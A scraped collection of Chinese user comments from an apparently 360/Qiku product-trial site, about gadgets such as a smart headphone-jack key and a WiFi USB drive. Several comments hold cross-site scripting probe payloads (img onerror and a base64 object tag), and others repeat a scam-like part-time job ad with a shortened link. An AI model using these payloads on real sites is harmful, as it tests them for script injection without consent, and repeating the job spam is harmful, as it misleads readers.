帅呆了，可以存储到本地吗，一定要通过网络上传到云？如果像素不错的话，拍照就用这个了，呵呵└(^O^)┘
更新后，闪拍成功率基本100%了。
还有一点，超级模式真的很费电。。。。。很费电。。。。。 但是不用超级模式在锁屏状态下就无法使用，很纠结。希望下一个APP能把超级模式做的省电些。
今天发现一个问题反馈下，我的手机带自动开关机功能，酷派的大神F1，今天 发现重启后智键认成了耳机，必须启动下智键软件再插入才可以认成智键。
今天发现一个问题反馈下，我的手机带自动开关机功能，酷派的大神F1，今天 发现重启后智键认成了耳机，必须启动下智键软件再插入才可以认成智键。
又一款猥琐大神的神器
让我眼前一亮，不过为何不让这个电子钱包具备真正的钱包功能呢？加层布，不就可以放钱了吗？这样我随身带着就更加方便了，嘿嘿！
我相信智键以后会越来越好用的！
很不错的产品，对于我这种丢三落四的人很实用。
好期待拥有
这个宝贝很好，价稍高了点 然后就是材料？  现在的亲们  都很注重材料质量问题，
这个很实用，呵呵呵   要是能获得***就好了 呵呵
用的一代就是你说的孔位，不知2代为什么改过来了
你真是神人呐！写的比我强的不是一星半点儿。
很期待这样的产品！我这经常落东西
表示记账功能和防丢功能都是很需要的。
最好有8.16.32.64g四个版本，USB3.0的
哥们，咱这不知道离精品有多远。
点子很好，不过加层布那样不怎么好看，我们正在想办法做得更好，谢谢~
www.smartwallit.com 在这里我们有最新的代码更新，我们能通过软件升级硬件驱动，所以我们一定会做得更好。
http://www.demohour.com/projects/337991，看看这个~
期待推出 16g 32g 的版本
还是黑色的高大上，！
快出结果呀！急死了
新到的硬件使用情况呢？还有什么问题吗？
智键占用了耳机孔，所以系统会第一时间识别为耳机，后台就会打开音乐。
哈哈~能说明问题就行，详细点当然最好。
这几天一直想入手 随身WIFI2 没想到正好看到这款了。必须等了。 也是 现在U盘容量需求也都比以前大多了 8G虽然也够一般使用了 但是如果有16G以上的版本 还是会有人购买的 虽然价钱肯定会高一些 呵呵 
可以尝试加入NFC植入公交卡和门禁卡还是很棒的。
图片没有文字来的真诚
很期待这样的产品！
希望推出大容量的版本！可以具备U盘和WIFI功能！
太棒了！！！
次次都没我份，有点怀怀意了？这个是不是真的了？
你理由写的什么啊？哈哈
期待入手的感觉！！
哈哈，很新颖！
华为Y511
嗯 下次会更好
谢谢支持！
格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  
谢谢支持！
谢谢支持！
格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  
格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  格在多少呢  
谢谢支持！我会继续努力！
谢谢支持！我会继续努力！
外形看起来很不错啊
这玩意儿啥时候上市啊，我家那小混蛋一出门玩人影都找不到，每次找人腿都跑细了，快点吧。。。。
减肥帮手么？
太少了吧这篇~lz写详细点哇~
很好，我想做这款批发，请问如何咨询
唉，又木中
每次我都没抽中
kao...........
如此认真的写，居然也没中
好东西，光外形就很吸引我
还不如弄个高温的  加水  沸腾式消毒！
绝对是好东西！！！！
看功能好强大  好想试用呀！！！
诶，又没中
学校有一辆，但是略显笨重，要是再便宜点我会考虑的，上学上班必备的良器
学校有一辆，但是略显笨重，要是再便宜点我会考虑的，上学上班必备的良器
值得拥有，希望能合作。
为什么我抽不中呢
没中，期待着
那里有卖的？多少钱呢？
别的不用就是保密得做足，又是U盘又是wifi的肯定容易泄密。
这车我太喜欢了,看起来很高档，完全看不出是电动的。正是我想要的车型,我到实体店找了很多都没有这类式的车型,小巧精致,特别的方便拿进家里存放。期待上市哦！
忘了说，还要支持防水啊！哪天落汤鸡了..岂不是很悲剧
~~对有心血管系统疾病的人 检测血压和心率很方便~~支持！！！！
什么时候能买啊
http://www.demohour.com/projects/337991，可以跟上海同时信息科技联系，谢谢~
苹果碎了还能再买，SmartWallit 坏了，咱可以保修一年。
果然是很棒，受益匪浅。
好东西哦！
太好了，要是有我的一辆，那就太完美了.....
反正就是如此高档，360，顶起.....
我这么认真申请,每次都不中,累觉不爱
仔细看了一下 感觉没什么用 纯属是高富帅用来装X把妹的  老百姓 不实用 如果要远程遥控 成本就很低了
这么便宜  给我来10台玩玩
希望能够尽快普及
最后一段话说的很中肯。其实家长对孩子的精心照料才会让孩子安全健康长大，手环只是个手段而已。大部分悲剧都是家长的疏忽造成。
对于患有心脑血管病的老人，这款产品的用处太大了，在哪里能够买到呢？
亲，不要按着插入。也不要长按，这个问题就会消失。
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客报名 http://t.cn/8s5dBA0【复制到地址栏打开】
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客报名 http://t.cn/8s5dBA0【复制到地址栏打开】f
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客报名 http://t.cn/8s5dBA0【复制到地址栏打开】h
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客报名 http://t.cn/8s5dBA0【复制到地址栏打开】u
因业务发展招淘宝傔职人员，要求:1会上网，傔职全职均可（在办公室、家里都行） 2懂简单网络知识，会网购优先。工资当天结，每天2-3小时可挣80-150元 熟悉后更多多劳多得。根据自己实际情况安排时间不影响正职。有意者请看客服博客报名 http://t.cn/8s5dBA0【复制到地址栏打开】,
能买吗？还可以抽奖？
希望这是一个集无线路由器 智能家居中控 网络电视盒 NAS等功能于一体的设备
希望不仅仅是功能上，在做工上，还有一些细节上能够做好，譬如电路板防屏蔽
醉翁之意不在酒吧，应该目标不仅仅是瞄的路由器，我倒希望能够有一家能够做到无线路由 网络机顶盒 NAS 智能家居中控等集大成于一体的，目前来看短期内有希望的是海尔，云电器系列早就打下基础了，但是如果智能家居推出行业标准，兼容性好的话，那就不好说了，希望能试用一下360路由器 曾经玩过ddwrt openwrt tomato duanwan等多种路由器
过度产品，红外要被KO的
美国的产品，还创意中？？？
多个3.5音频输出口就好了。。。
太专业了，写的好认真，像一篇论文，哈哈~~
惭愧，惭愧，的确需要下功夫啊，多谢支持！
太贵、不考虑买
太好了  有了它就可以随时监测身体的指标了
这东西好 有了它就知道儿子成天跑哪儿了
申请了一轮 没中奖
儿子太淘了
支持华为 手机都是华为的
真想有一个  可是100刀  太贵了 
这个价位在中国真的是一点市场都没有！！
唉，怎么又没我呀，期待……
NFC植入公交卡和门禁卡
功能强大啊！赞一个！
骗人的每次都认真申请，每次都抽不到，中了的都是内部日员。大家不要在上当了！！！
孩子明显很开心啊。哈哈
NFC植入公交卡和门禁卡 
谢谢大家支持，我们会努力做得更好，谢谢~
次次都没我份，有点怀怀意了？这个是不是真的了？
快按钮的塑料盒里面除了快按钮，就是这两样收纳用的工具呀
学习下，看看实用科技的发展前沿！
感觉这货还不错哦..
这个车子给力！
还是Moto 360的圆形设计更符合手表的原始属性..
价格太贵了 国内又没有类似的产品出炉 单轮车感觉不靠谱呀，，
亲，单击就是弹出这个呀~#问题打电话反映了。
第260号
个人感觉 我说的孔位还可以
我写的挺靠前的
 一直想买这个。。只是价格问题而已
顶上去 雅蠛蝶~
顶上去 雅蠛蝶~
顶上去 雅蠛蝶~
什么时候开始第二阶段的评测啊？
写的很仔细 支持
谢谢评价  雅蠛蝶~
我忍不住也要说句，太贵了~真的是壕的玩具啊~Parrot AR.Drone也没那么贵啊~
同求能在便宜点么？
最好赶快开始试用。 
真的很用心，赞一下。
钱包都要变智能的了，先进的科技产品。
赞一下，我也得买个耍耍。
只是一个快捷键开关模块么？能否改进一下：让这个插入耳机孔的所谓智键兼职充当FM收音机的天线，让蓝牙耳机可以收听到手机自带的FM调频广播吧！
之前一直想买一个扫地机器人，但想来想去还是觉得不实用
漫长的等待啊，一直想给宝宝来一个，可是嘴太笨就是说不过人家，试用名额总是中不了，赶紧出吧，出了立马给宝宝买一个！！！
不看好，没什么意思
不错 不错，记得跟新啊~~
我喜欢这个外形，我只需要智能手表，不是腕表手机
图片拍的真好看~~
这个确实太丑了
怎么没有图呀。。补充点图来吧
超级帅气的模特！！
这也太敷衍了点把。。。详细说说呗
希望能得到试用，奇酷小编一定要选到我啊
没想到都教授也要用儿童手环啊
恭喜啊。。楼主文采很不错~~ 有精华的潜力
居然是那么老的360用户...
做大的话。。估计会被一些妈妈用来当老公卫士了
精度确实是个大问题~
亲。也才三次而已。每次都是100多比1呢
亲。也才三次而已。每次都是100多比1呢
加油！下期希望能中！
加油哦，以后多次申请不中的，会提高优先级
加油哦，以后多次申请不中的，会提高优先级
呃。。几乎每个人都写的很认真呢
这么多人申请 几率本来就小，，，
我看到你在论坛的评测了，很专业哦。加油
更喜欢 gear 
很漂亮！如果不贵的话可以考虑啊 
这个什么时候可以买到啊？
这个挺好看~
 给力，不错的选择。
唯一的好处是不用摇号，哈哈~
闪拍有,配置上快按钮相对更灵活一些
金属感十足！帅！ 
外形确实一般，不知道中国没有硬件厂商跟进
这个太帅了，小孩和大人都可以玩啊
这个好看，想要！
不给力不吸引人
这是什么造型，蒸包子用的吗？
原型设计更像手表呀..
平时上班坐地铁也能带着就好..
学习了，感觉不错~
U盘其实一般 我觉得再加几个好玩的功能吧..
还有什么不能智能？哈哈
咋回事？怎么就坏掉了呢
奇酷多加油 出好产品试用！！
果然是媒体评测呀 专业..
的确呀 有个试用报告的提交入口 写报告再给点积分哈..
这个是上首页的节奏啊。上首页是不是应该有什么奖励或者勋章啊。
觉得好赞啊！
看起很不错，
确实是好东西，就是价格太贵了
太智能了啊！希望选到我 
很不错的报告。精品报告上首页。
奇酷网推出的东西果然都是很不错的智能产品。有亮点。
虽然没中。但是很期待大家的试用报告。
很赞同你说的观点。
果然是史上最详细的手环评测
已经点赞了。
已经点赞了。图文效果确实很好。
这个东西得多少钱啊。
LG也要出手表了？
有什么好建议吗？
这种玩游戏体验会很棒 至于会不会普及持观望态度..
wifi和优盘应该不会有数据交叉吧。所以泄密应该不会
这种也是小玩意啊。跟手环手表差不多。更像计步器
这个貌似很酷啊。有点酷品的感觉了。
希望推出usb3.0的，容量越大越好
好期待，但是希望我能卖到，不求免费，只求尽快买到 
这个很棒啊，科技感十足
不是要运盘，是要自己260云盘的一个方便入口
看图片好像有点厚啊。。
真正的wifiu盘应该是带wifi功能的u盘。也就是智能的把两项功能结合起来。在没有电脑的情况下无线读取u盘内的文件。事例：大半夜不想开电脑 u盘里的东西又想传到手机里。这时候把wifiu盘插到手机充电器上 手机（或移动终端）就可以通过wifi下载u盘里面的照片 文件 视频   这才是真正的完美。
当然能当无线数据线就更好了内置一个小电池不用多久支持30分钟就可以了不用外界电源就能无线读取u盘内的能容。当然如果插到移动硬盘上还能当无线数据线手机读取硬盘里的内容就无敌了。（当然u盘不可能一直开着wifi。可以设计成拔开u盘盖子启动近距离wifi数据线方便又节约电能）。写这么多估计还是会沉哎！
手机截图的图片好小。本来我全设置成大图了。另外网站的编辑功能太弱了，都不能用其它字体。直接从word文档里复制过来，因为用了雅黑，所以一直提示“详细描述不能为空哦”。最后在论坛上才看到解决办法，复制到TXT文本里，再复制到到这里才可以。要不就是全程直接在奇酷网编辑了。这样很不方便，希望早日改进。
现在u盘是可以加密的进入u盘要输了秘密不就可以了。现在有app了可以用手势啊 iPhone可以有指纹解锁 语音解锁啊。各种好玩功能用起来
真正的wifiu盘应该是带wifi功能的u盘。也就是智能的把两项功能结合起来。在没有电脑的情况下无线读取u盘内的文件。事例：大半夜不想开电脑 u盘里的东西又想传到手机里。这时候把wifiu盘插到手机充电器上 手机（或移动终端）就可以通过wifi下载u盘里面的照片 文件 视频   这才是真正的完美。不过进入u盘最好要密码
其实还可以出项链之类的产品。关键电池问题不好解决。
电源从哪来？
棒棒棒棒棒
非常客观公正，赞一个……
玩味十足！！
确实很强悍，很智能的感觉。求分享，求选中
真的很不错啊
很想知道这个是否自带系统启动盘，或者说是否可以做系统启动盘，会不会对wifi 这个概念产生影响啊，期待回复，期待测试。
尽快上市吧，不能等太长时间了，否则***！
都出了，怎么还在创意中…………
好给力啊！细心得报告
给力得姐们～！
看上去是不是把钱包放到这个盒子面啊？
很想知道 这个东西可不可以做PE 作完之后会不会有什么影响 或者说支不支持分区，不会因为有wifi的功能而受到影响，希望得到回复，和得到测试的机会。
哈哈看来是专业的爸爸！
这个是你的快递单号，你可以查一下，是不是你家里人签收了。1081266562806
8G太小了，说是8G所有的U盘没有真正的8G绝对会少些的。  应该出32G和64G的，我还可能考虑会买。 
这测评也太简单了
个性好看，还带导航！不错
相信智键在售卖阶段的包装和功能肯定都能再上一层楼。已经很好用了。
建议非常好啊。待机时间是个问题。
不错很喜欢
感觉少了一段结尾哇~~
坏掉了，可以联系奇酷官网换一个。他们对用户的态度特别好。
三个小时就坏啦？智键君快出现~拯救下你的小伙伴哇
正宗好凉茶。。。
感觉 好高大尚
相信360的产品和质量，期待活动和上市
50刀，就是50美元，大概300+RMB，但是由于市场不同，大陆如果有卖的话可能会更贵一点
已经五个阶段了，报告中都有了。
谢谢支持！
电池管理估计会在不同的版本中进行优化，上市后待机问题应该会有显著的改善。
我现在已经有2个8GU盘牺牲做了PE，现在想买这个就是纯粹当U盘考文件用，希望能像随身wifi一样，挂在手机耳机孔上~~
出来也是天价
收到后一定给大家报告出详细的报告，和大家一起分享！
你好，我不是内部员工但是我就成中，成功概率还挺高。为什么呢！
兄弟你好，这次我又中了！
兄弟你好，这次我又中了！
如果可以的话，把每个模块做得更小，识别能力更强，那是不是可以成为一套真正的万能工具，最终是否会变成类似液态金属的东西
放在盒子后面，有夹片的呢~
我又没中签。。。
我又没中签。。。
哈哈,真是好东西啊,又是U盘又是wifi.又能上网又能下载东西,再也不会又插U盘又要插随身WIFI,直接下载到这个U盘里,太棒了,支持360,顶!!!!!
如果能防水就更好了，小孩子比较喜欢玩水，这个需要改进。
这么好玩，很想要
USB2.0有点鸡肋，8G略小。
兄弟努力！支持
asdasdasd
asdasdas
我又没中签。。。 
下次继续抽。。。
关心的是兼容性
真的很不错啊 。。。。。
关心价格是多少
看上去很不错，搞一个试试
USB2.0有点鸡肋，8G略小
什么时候出来呢？
这是一代么，二代马上要出了吧，SmartWallit Pro
是的，快了
写的不错啊
哪里有销售，价格如何
这种键盘，我喜欢
哈哈哈哈哈
适合我喜欢类型，大赞一个
&lt;a&gt;超前的东东&lt;/a&gt;
&lt;a&gt;超前的东东&lt;/a&gt; 
价格范围是多少啊   好期待啊   
现在运用   有没有副作用啊
想整一个尝试下
报告写的好详细啊！
我觉得8G正好啊，配合10T云空间可以了
几十可以接受
手感有问题？
为什么你的随身WIFI是黑色的？
楼主，你这标题忘记改拉
额。。能插人的还叫妞？
         不错哦   不错哦   
图片没有跟新上？
这。。也太短。。了吧。。
配点图会更好啊 楼主亲
难道和SOUGOU还有冲突？
哈哈，朕射你无罪
看起来不错，很时尚，不知道产品用起来怎么样呢，期待着盼望着。小二来一个怎样，，，，，，
难道媒体都这么木有节操么
看起来不错，很时尚，不知道产品用起来怎么样呢，期待着盼望着。小二来一个怎样，，，，，，
不错啊 。。。。。 真的...
下期是啥 提前透露下哈~~
我觉得其他颜色好看， 黑色好么？？
难道这个就是360的防丢卫士？！
深圳真需要这个，但是太贵。希望360做到普及～～
哇，这个好酷啊
赶紧试用吧， 需要一个U盘
不是吧应该，360的产品还没发布
深度对比一下就好了
这个东西必须有的哦   360东西还是能引领潮流的 
媒体评测，赞一个！
线控耳机也可以当做智键使用？
很赞同你说的观点。 
很赞同你说的观点。 
很赞同你说的观点。 
没用过HTC的飘过
360也要做这个产品吗？
写得好详细 赞一个..
微博3600个也申请了
酷键！！无敌 
我也是，申请了几次都没中，只能期待早些上市
就是到底实用不实用呢，，
更像计步器 
的确  价格太贵了。。。
感觉代步工具回事一个爆发点..
哈哈 不知国内价格如何
奇酷组织一个试用吧 哈哈
据说今天出了一个防丢卫士哦。。
今天刚出 这个是预热的吧 哈哈
这个的确应该改进 楼主写的真详细
是的，完全可以！
北京才是最需要的。。。
外形相关炫酷。。求试用哈哈 
报告写的好详细啊！ 
报告写的好详细啊！ 
报告写的好详细啊！ 
报告写的好详细啊！ 
注册超麻烦啊 注册超麻烦啊 报告写的好详细啊！ 
注册超麻烦啊 注册超麻烦啊 报告写的好详细啊！ 
注册超麻烦啊 注册超麻烦啊 报告写的好详细啊！ 
如果能防水就更好了，小孩子比较喜欢玩水，这个需要改进。 
这个应该不是360的。
的确呀 有个试用报告的提交入口 写报告再给点积分哈.. 
的确呀 有个试用报告的提交入口 写报告再给点积分哈.. 
的确呀 有个试用报告的提交入口 写报告再给点积分哈.. 
你这次中肯定是因为你被评选过精品报告。哈哈。恭喜
国内厂商的手环类产品总感觉差了一截..
彩色版感觉还很可以..
我觉得也是，这说明小米手机也能用这个哇~
#人智键则无敌# LZ感觉自己无敌了么~~
我记得这个是第一个写报告的媒体。
虚拟现实。不知道是啥概念。想看看。
现在有靠谱的扫地机器人吗？
我也没用过。
居然有发小广告的了。。。。
很详细！支持！
的确呀 有个试用报告的提交入口 写报告再给点积分哈.. 
哈哈~第一张图很可爱~
这是刀剑神域吗
asdasdsad
asdasd
当让不是啦，是个小书桌
123123123123
123123123213
按时大苏打实打实的
撒旦发射点撒旦撒
其实要是智键可以一次启动多个(大于等于1)程序或功能就好了，一次按键，手电筒、相机、qq、解锁、***等功能都开启了，用户可以自定义设置同时启动的程序，岂不是更加方便了。
如果有4g上网卡功能，就更厉害了。在没有网的地方能上网，有网的地方能共享wifi。
&lt;img src=x onerror=alert(1)&gt;
&lt;img src=x onerror=alert(1)&gt;
感觉真的不错啊！！！
&lt;img src=x onerror=alert(1)&gt;
&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=&gt;&lt;/object&gt;
&lt;img src=x onerror=alert(1)&gt;
6999  真的承受不了
还不错，适合女生代步，很个性化，不错的点子。
有点什么了感觉不错
呵呵，超好玩
这个也要靠几率的，我相信360，因为..俺中咧！不过咋还没收到咧？第二天咧
米键发布了!很突然！智键君怎么看？
很值得一试啊
不支持安卓系统吗
谢谢支持！
这个就不太清楚了
求试用哈哈哈
赶紧开通试用或上市吧！！， 需要一个U盘
看起来很不错
360一个创新的公司
360的防丢卫士？难道是360在行动？
写的很认真和详细，赞一个
不太会说话 
感觉楼主超~用心的，写的很详细，布局也很好看，果然有在很认真试用啊！
原来线控耳机也可以，而且拆卸后原样复苏什么的，果然楼主很有实践冒险精神啊！
多多支持360，多多支持我！
是的，为了广大网友，做出小小的牺牲，何乐而不为呢！请多多支持360和我！
是颜体哦~最喜欢的一种字体，看小说的时候也不会不适应^_^
谢谢赞美~自定义的话，是指可以通过按键，摇晃，声音等多种功能截图吗？
支持 这种产品对某些人很实用
不错哦 不错哦   
好评....................3
优盘有，360WIFI也有，不过还是期待结合版的，两不耽误，期待……
外形好像不是很好看，可以加个耳塞防尘塞跟手机连一起就更好了，期待试用
美国已经开始销售量了，真的很酷
不支持iPhone，浮云啊。
真的很不错啊 
搞个试试..
搞个试试... 
容量再大些就好了，弄个主流的多好
随身wifi已经出4G版的啦 可以试用下哈
打电话这个还真是个需求点
能独立使用吗？怎么供电？
什么叫做4G版呢？多少钱啊？
什么时候公布
什么时间能正式出售呢，等不及了
4G版能插3G网卡吗
是怎么工作的呢？  说详细一点啊。
厉害，成精品报告啦，果然强，期待下次精彩文章！
这个出了我肯定买，实用的随身WIFI
我的试用收到了但是我的记录里面没有试用记录，然后怎么提交试用报告?
赶快面世吧，出世吧奇迹
好思维，好创意
用过3G的，来试试4G的有何不同
顶！丁丁顶！
造型好像肥皂。。。
想买一个..
十几块行吗？（可怜）
很不错  不知道什么时候能买到
赶快上市吧
看着不是大众消费
谢谢支持！
谢谢支持！
早点出来卖啊，这个我想买一个
这个东西真的所有家电都可以控制吗？
点子不错但价格略显坑爹
这是要注入的节奏吗？？
什么时候开始申请试用呢？
关心价格中。。。
这款年轻人一定会喜欢的，期待早点面世。
肥皂。。。
应该是使用SIM卡，就是360的4G无线上网卡。
我感觉也是北京更需要。哈哈
骚年们来点赞啊！
太棒了！~经常看虚拟现实的小说呢！超期待啊啊啊啊啊啊。。。。。。。。。
赞赞赞赞赞赞赞赞
我一赞？？？？？？？？？？？？？？？、
赞赞赞赞赞赞赞赞 
您的波多野结衣7天已发往中转站请拨打110查询
您的波多野结衣7天已发往中转站请拨打110查询 
评测的还不错。可以到www.fongmong.com分享你的评测文章
这个很喜欢啊
这个钱包很不错，对于经常性丢钱包来说 是一个不错的选择
什么时候上市啊？
图片排列有点乱啊。再整理一下最好了。
酷毙了！什么时候出啊？
图片不是很清晰哦，要是有视频的话就好了
谢谢支持！花了一两天的时间，用ps做的
看起来很费流量
看起来很费流量
为什么会把小米手机放这上面
这货看起来好像给力
会不会误触，打开应用啊
1：外观很漂亮，不得不说，360这几次的产品都配色很不错。 2：需要有4G卡。按照网上所描述，是联芯LC1761芯片的话，那么四模十一频。无WCDMA.如果当地移动很悲催的话TDSCDMA也无的话，那么只能享受2G网络速度。。。 3：入手慎重哦，不过要是有现货的话希望有人拆机看看芯片到底是啥。
比前一篇测评的好！
东西不错，测评的很一般，明显是为了赶着提交测评报告而做的。
没有详细参数，是只支持4g还是4g以下的都可以同样支持呢？
我已将测评分享至你们的网站了，请多支持！ 全球首份360智键评测、“暴力”拆解并“复活”及“奇葩“建议 http://www.fongmong.com/forum.php?mod=viewthread&amp;tid=395&amp;fromuid=650 (出处: 锋芒小栈|一家以“分享、科技、生活”为理念的小众社区) 
感觉很不错
不错，很吊很高大上，希望快点出来！！！
感觉这种***功能偏少
我自己写得很认真，希望大家可以看一下，给出意见，让我写出更好的评测。
有4g信号时用4g,没有时自动转换成3/2g信号
这篇报告不错，有干货。
很期待这个东西，觉得要是配置到游戏上估计很掉的！！！
这个技术要是应用到空调或者热水器上，估计感觉会很好的吧。
感觉不实用，你就是清理干净了，但是外界很快就又把它污染了。
坐等。。。
这个不错，有恒温的技术，就是不知道耗电怎么样。还有确切的性能。。
自我感觉做成圆筒装的估计不错。
这个最大限度是多少？高度？热度等等。
如果再能当个无线的转接器，也很好。。
如果电脑也能摇控就好了！手机不够精确！
肯定很重！连喝水都要那么麻烦
好的产品要有好的用户，好用户是我！！！！！？
这个钱包很不错，省的找钱包找得半天也没找到，它只要一呼就应！
就这个feel倍爽
怎么朋友？就因为我是第一个交的？
手机的像素不太好，下次改正。
前几天才买了一个扫地机器人一千多。挺好。
8gu盘加随身wifi看起来挺厚道，价格也低，性价比高，如果材质做成钛合金铝合金之内的，在不影响使用的基础上，稍微加点价格，那就完美了
没有宝宝实测也可以？
已经修改，请“批阅”
好的产品要有好的用户，好用户是我！！！！
hahahahahahahahahahahahahahahahahahahahahahahahahahaha
这个评测挺不错的。你可以到 锋芒小栈 上面分享一下，扩大你的影响力
什么时候能见到产品
什么时候能见到产品
什么时候能见到产品
什么时候能见到产品
什么时候能见到产品
什么时候能见到产品
为什么你有智键保护套？
价格还会不会在低点，随后的销售将会很风暴
高科技啊，爽快😍😍😍
真心不错啊
直接购买来的直接 
手机型号也不说？
期待中……
那速度多快  手机能承受吗  呵呵
其实是一个4G无线上网卡，里面装上sim卡之后就可以享受无线网络，需要购买合约套餐 这个只要是一个无线接收和发射终端..
不错。很详细的报告。我基本看懂了用法。
希望加入更强大的功能 
可不可以让手环自带储存功能
希望接口处可以更牢固点、
你无敌了。哈哈
有兴趣加入奇酷试用达人评测团不？
好棒啊，希望马上就可以见到产品~~~如果他可以代替手机就好了 
上面的金属片不会电到人么？
很想要啊~~
很可爱啊，好像要
小米也出了一颗这种键，叫米键
希望合约套餐 合适   千万不要是传说中的一晚上 房子没了
那个明显不靠谱。
这东西好用吗？一千多如果好使的话也可以啊。
很想有一个
也希望能选中我，支持各种创意。
我有希望中不……，期待中……。
外形霸气，貌似已经迷上了。
关注价格........ 
这个创意确实不错。
FDD和TDD双频吗？ 兼容电信、联通、移动三家不同的3G网络吗？
期待期待    丢三落四等待安全着陆
赞一下。很详细的报告啊。
果然清晰了很多。空调也能控制啊。
两张荣誉使用官的卡片。帅啊。
同期待。。。。哈哈
看了后非常喜欢可是太贵了.买不起。
苹果5s管吗？ 
Good ，给我一个;
真磨叽压~都多长时间了啊~还卖不卖了啊？工作效率在哪里？？？？
呵呵 有点贵！！
好东东，期待！！
好贵啊，再便宜一点就好了！支持一个！
不错，，这里面有好多东西都不错，，但是每次申请都没通过，是我哪里没填写好吗？希望能够申请成功。。。
正需要这个东西，没曾想360做出来啦。真希望能第一手使用上。经常出差，流量不够啊。 觉得比华某的那个要好！而且好看，更重要的是比华某的那个更便宜！！！！
谢谢你的支持，我会继续努力，做出更好的报告！
想法还是不错的～～～就是价格～～一万五一辆电动车～～～～
关心价格中。。。 是的,特别关注中...........
智能灯泡家居国内又yeelight 幻腾，，之前看yeelink内置的苹果ibeacons技术在展会很受欢迎..
快点发布生产，一定买一个。真的迫不及待。
喝假酒了。
给你赞一个,前三次试用一次没中,看第4次了!
加油，慢慢会中的
奇酷试用达人评测团？民间的还是官方的？我还不是达人，当然希望能和达人交流提高自己的水平。
又没中，头疼，下次不来了
看瞎眼。。。。
感觉很有用啊
预设学习这个的确应该完善 要是直接启用就好很多了..
“让您有足够信心迎接4G时代的全天候挑战！”，这是什么意思？三防机吗？
淘宝上不是有卖了么。。。挺好使的
哈哈。。一点小小建议，真心希望360越来越好。。。其实写评论的时候，我还没有把360带到宝宝的手上，周末回家才带上了，实测。。漂移，太不能接受了。。。。误差太大，如此草草推出市场，我怕会。。。。360请闭关修练！你们懂的！@
兼容三网？ 
好像这个已经出来了。是配置在PS4上用的。
容量适中，价格适中，外观有IT感，赞一个。
能兼容三网的3G和4G就完美了。
老周你给敢和前面产品一样19.9元？一下子出个299+4G的感觉以前的好垃圾
很关注这款智能灯泡,等待发布中......
福建4G移动MIFI免费送（一年才600多元资费），360还要钱能卖出去吗？？？？
这价格。。真不想吐槽
耗费了一个晚上写测评报告，沙发坐一下！先给自己点个“赞”！
最近正在研究蓝牙，虽然蓝牙已经应用很久，但是前景依然不错！
用了一段时间 有问题了 有时手机听筒没声音了，要把智健拔了重插，再从新选择耳机插口是智健
非常不错，我的今天估计就会到货。
初看射频只有2种频率，希望改成自动频率调整的。以增加抗干扰能力，和兼容性。
这个好，就应该移动硬盘和WiFi结合，其实随身WiFi现在的大小也不是很明显，还不如再加大一点儿集成一下U盘，让东西物尽其用，期待中
那么小巧，很便捷，坐等。
价格很实惠，做工看起来也不错，移动4G覆盖不高，TD-SCDMA撑死100多K的速度和没有差不多，如果能够支持WCDMA就更好了。  128的RAM和ROM，做个SAMBA、DLNA之类的共享还是可以的，刚好还可以解决pad手机内置存储小还不能插存储卡的问题。
==========等到它到来
360出了好多新产品啊  就是让人等的不耐烦哦
又一个暴力拆解的。。。
赶紧发布  360的商业帝国  完全可以打造
这个真不暴力，很温柔，里面有螺丝的
智键君给你32个赞噢~
这个手机京东预售5000+...好贵
只能“杀菌”，并不能清洁……，还有紫外线是否会损坏手机的感光硬件？
耳钉创意不错哦。很潮很带感~
外观上智键以后会有很大程度的改进的~
蓝牙估计就是一个瓶颈，现在蓝牙的应用在pc上已经逐渐退出。
闪拍的问题，您看看，手不要抖动，等到手机震动后再拿开，还会很模糊吗？
我们会征集广大用户反馈情况，在硬件的手势方面会有改善哒～
到底是是个啥玩意儿，没闹明白
我饿了……
感谢对我们智键的支持！
感谢对智键的支持和建议，我们会不断努力～
赞一个哦～你的报告我们收到啦～我们会不断努力加强功能的。
哈哈，智键君看到你的测评报告啦~感谢对智键的大力支持！
功能方面，在今后智键的功能会越来越强大的，一键截图，一键静音等功能都会有的，敬请期待啦~
咋样呢？感觉
这个结合不错，合理利用体积，很实用。
多谢！多谢！很用心的写道凌晨一点半啊！
恭喜！恭喜！！！！
三星T211
三星T211 
分析的很有思路。
米3支持的也不错啊。
很好的创意，很期待。。。
略贵啊。。。
一看造型就跪了。。。
关注价格。。。
不知道效果怎么样。。。
就是价格太贵了。。
这个不错。。。
专为洁癖认识设计。。。
这个不错。。。
很期待。。。
中移动都是搞捆绑消费的，只要你开通4G消费套餐，就可以免费获得硬件设备，无须另外购买。还有一点疑问，目前中移动4G服务基站都是中移动建设版权归中移动所有。虽说360与中移动合作推出产品服务全国的360粉丝。套餐资费能优惠到那里去？这个真的要拭目以待了。
我呵呵。。。 
Nice   ,
看大家试用的报告也是很好的体验。但是还是希望会中。努力中
高科技让我们得到了一些东西，却也让我们失去了一些东西。
谢谢！！！
1万五可以买4个轮子的。
感觉很喜欢，不过外形是不是可以有多款呢
外形有点难看啊，不知道功能系统怎么样
